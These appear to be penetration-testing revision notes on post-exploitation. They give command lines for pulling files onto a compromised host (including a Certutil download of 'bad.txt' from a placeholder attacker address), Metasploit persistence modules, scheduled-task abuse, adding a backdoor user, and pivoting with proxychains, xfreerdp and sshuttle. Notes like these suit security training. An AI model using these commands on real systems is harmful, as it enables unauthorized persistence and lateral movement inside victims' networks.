## Post Exploitation - Review

### ðŸš© File transfers
* python -m SimpleHTTPServer 80
* python -m pyftpdlib 21 (attacker ip)
*   ftp attackerip (windows machines)
* Certutil.exe -urlcache -f http://ip.address/bad.txt output.txt
* wget (linux machines)
* metasploit

---

### ðŸš© Maintaining access

#### Persistence Scripts (Metasploit)
* run persistence -h
* exploit/windows/local/persistence
* exploit/windows/local/registry_persistence

#### Scheduled Tasks
* run scheduleme
* run schtaskabuse

#### Add a user
* net user FakeUser Password1 /add

### ðŸš© Pivoting - Using a compromised device as a condui to reach new locations. For situations when a secondary device is only reachable through a compromised device, or for more covert activities (more in the realms of Red Teaming).

#### Proxychains: Bind port, Proxychain, Proxy  

1. device 1 has access to device 2 which is not reachable from our attacker machine device 0  
2. proxychain and bind port is setup on device 0  
3. proxy tunnel on devive 1  
4. target is device 2

         Example Syntax

* ssh (into device 1 and setup a proxy tunnel with a bind port, so all traffic will be proxied through device 1, between device 0 and 2.)
* proxychains nmap 10.10.10.225 | scans device 2 with standard nmap syntax, because this is pchained it may be unstable on syn scanning. So switch to -sT as tcp scanning could be better

####  xfreerdp: RDP pivot into a device by placing proxychains infront of the normal syntax
   
      proxychains xfreerdp /u:administrator /p:'Password1' /v:10.10.10.225

####  Sshuttle

      sshuttle -r user@ip.of.device1 ip.of.target/24 --ssh-cmd "ssh -i pivot"
keep terminal live, move to new terminal. Aslong as the sshuttle terminal is live we can execute commands in the new terminal without having to type 'proxychains' infront of every command if using proxychain.
